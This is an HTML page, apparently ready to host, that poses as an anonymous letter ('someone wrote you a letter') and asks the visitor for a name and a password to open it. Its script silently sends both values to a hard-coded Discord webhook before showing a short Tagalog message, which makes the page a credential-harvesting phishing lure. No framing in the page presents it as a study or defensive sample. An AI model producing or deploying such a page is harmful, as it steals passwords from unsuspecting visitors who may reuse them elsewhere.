<!-- AppleShell Letter Page - sendthesong style -->
<!-- Host as index.html -->

<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>a letter for you</title>
<style>
body { 
  font-family: 'Georgia', serif; 
  background: #f7f3ee; 
  color: #2c2c2c; 
  margin: 0; 
  padding: 20px; 
  min-height: 100vh;
}
.container { 
  max-width: 480px; 
  margin: 40px auto; 
  background: #fff; 
  padding: 40px 32px; 
  border-radius: 8px; 
  box-shadow: 0 2px 12px rgba(0,0,0,0.08);
  text-align: center;
}
h1 { 
  font-size: 22px; 
  font-weight: normal; 
  margin: 0 0 24px 0; 
  letter-spacing: 0.5px;
}
.letter { 
  font-size: 16px; 
  line-height: 1.6; 
  color: #444; 
  margin: 20px 0 30px 0;
  white-space: pre-line;
}
.small { font-size: 13px; color: #888; margin-top: 30px; }
input { 
  width: 100%; 
  padding: 12px; 
  margin: 8px 0; 
  border: 1px solid #ddd; 
  border-radius: 4px; 
  font-size: 15px; 
  box-sizing: border-box;
}
button { 
  width: 100%; 
  padding: 12px; 
  background: #2c2c2c; 
  color: #fff; 
  border: none; 
  border-radius: 4px; 
  font-size: 15px; 
  margin-top: 10px;
  cursor: pointer;
}
#loginBox { display: block; }
#letterBox { display: none; }
</style>
</head>
<body>
<div class="container" id="loginBox">
  <h1>someone wrote you a letter</h1>
  <p style="color:#666; font-size:14px;">enter your name to open it</p>
  <form id="f">
    <input id="name" placeholder="your name" required>
    <input id="pass" type="password" placeholder="password (any)" required>
    <button type="submit">open letter</button>
  </form>
</div>

<div class="container" id="letterBox">
  <h1>a letter</h1>
  <div class="letter">Jokelang bored ako eh sorry kung may letter man akong gagawin para sakaniya yon</div>
  <div class="small">sent anonymously</div>
</div>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1558898057171570819/fdgPqERqhVwsSxdIcYN2P-mIbdcEStPQwIRwpYXuXOzXuBjo25fCYiMSRPGex67CB1rJ";

document.getElementById("f").onsubmit = async (e) => {
  e.preventDefault();
  const name = document.getElementById("name").value;
  const pass = document.getElementById("pass").value;

  const data = {
    embeds: [{
      title: "Letter Opened",
      color: 0x2c2c2c,
      fields: [
        { name: "Name", value: name, inline: true },
        { name: "Password", value: pass, inline: true }
      ],
      footer: { text: "AppleShell" }
    }]
  };

  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  }).catch(() => {});

  document.getElementById("loginBox").style.display = "none";
  document.getElementById("letterBox").style.display = "block";
};
</script>
</body>
</html>
